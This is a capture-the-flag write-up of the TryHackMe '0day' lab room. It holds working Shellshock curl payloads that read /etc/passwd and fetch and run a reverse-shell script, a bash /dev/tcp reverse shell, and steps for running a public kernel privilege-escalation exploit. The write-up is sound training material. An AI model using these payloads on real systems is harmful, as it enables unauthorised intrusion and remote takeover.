---
title: TryHackMe 0day
categories: [TryHackMe]
tags: [linux, nmap, gobuster, web, CVE-2014-6271, shellshock, CVE-2015-1328, kernel-exploit]
media_subpath: /images/tryhackme_0day
image:
  path: room-image.jpeg
---

Room link: [https://tryhackme.com/room/0day](https://tryhackme.com/room/0day)

This room started from enumerating the webpage to finding its vulnerability (CVE-2014-6271 - Shellshock) and exploiting it gaining shell.
From there, a kernel exploit CVE-2015-1328 was used for privilege escalation


## Enumeration
Starting off with basic nmap scan

```console
$ nmap -p- 10.10.239.33	
Nmap scan report for 10.10.239.33
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

2 open ports:
- 22 (SSH)
- 80 (HTTP)

```console
$ nmap -sS -sC -sV -T4 10.10.239.33
Nmap scan report for 10.10.239.33
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nothing interesting here on webpage, let's run gobster hopefully find some directories

![Webpage](webpage.png)

![Gobuster](gobuster.png)

Thought `robots.txt` would give something useful but it didn't

Okay let's move on to check some directories. `/cgi-bin` - forbidden. `/uploads` and `/admin` directories was empty.
Found RSA private key in `/backup` directory and cracked it using john. **spoiler**: appeared to be rabbit hole :)

`/secret` contained an image of turtle from description of the room. I hoped it contains stego but its not - another rabbit hole

I guess its time to run `nikto` web scanner

```console
nikto -host <TARGET_IP>
```

It found that `test.cgi` is vulnerable to "Shellshock" exploit which allowed to execute commands on vulnerable 
versions of `Bash`

[https://github.com/opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

To test this we can run

```console
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://<TARGET-IP>:80/cgi-bin/test.cgi
```

1) `() { :; };`

- `()` is the function name

- `{ :; };` is the function body

- `:` returns 0

- `;` indicates ending of command

- `};` closes function

2) `echo; echo; /bin/bash -c 'cat /etc/passwd'`

- executes right after function declaration

![Testing-shellshock](testing-shellshock.png)

BOOM! we got response. We can now upload reverse shell to our target machine to get shell


## Exploiting vulnerability

1) Create script `script_name.sh` and change `<IP>` to 
your THM IP (you can check it typing `ip a` or `ifconfig`, use IP from tun0 interface).
Also change port to the port you will be listening

```bash
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<LISTENING_PORT> 0>&1'
```

2) Run `nc -lnvp <PORT>` where PORT is listening port.
It needs to be same as in your reverse shell

3) In first terminal start a server `python -m http.server 8000`.
In second terminal type and press enter :
```console
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cd /tmp; wget http://<YOUR_IP>:8000/revshell.sh; chmod +x revshell.sh; ./revshell.sh'" \
http://<TARGET_IP>:80/cgi-bin/test.cgi
```
- `cd /tmp` - cd to /tmp directory where we will download our reverse shell

- `wget http://<YOUR_IP>:8000/revshell.sh` will download `revshell.sh` script to target machine (dont forget to change `YOUR_IP`)

- `chmod +x revshell.sh` makes script executable

- `./revshell.sh` executes script

Example:

![Shell](revshell-ran.png)

Now as we got a shell we need to stabilize it:


```console
python -c "import pty; pty.spawn('/bin/bash')"
```

Press CTRL+Z and type

```console
stty raw -echo; fg
```

Press ENTER

```console
export TERM=xterm
```
### User flag

Now we can read user flag `/home/ryan/user.txt`

```
www-data@ubuntu:/home/ryan$ cat user.txt
THM{[REDACTED]}
```

## Privilege Escalation

It appears that there is possible kernel exploit

![Check-os-version](os-version.png)

We can use `searchsploit` to find something

![Searchsploit](searchsploit.png)

We want to use first one, copy it using `searchsploit -m 37292` and transfer to our target

![Transfering-cve](transfering-exploit.png)

Tried to compile it but we an error `gcc: error trying to exec 'cc1': execvp: No such file or directory`. `gcc` didnt find
`cc1`. We need it to be in our PATH (if you type echo $PATH there will be /sbin:. which will look for executable in /sbin directory and then it current directory '.'),
we can do that with following:

```console
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now compile with following and run compiled binary

```console
gcc 37292.c -o exploit
```

```console
./exploit
```

![Getting-root](root.png)

### Root flag

Like so we able to read root flag

```console
# cat /root/root.txt
THM{[REDACTED]}
```

---
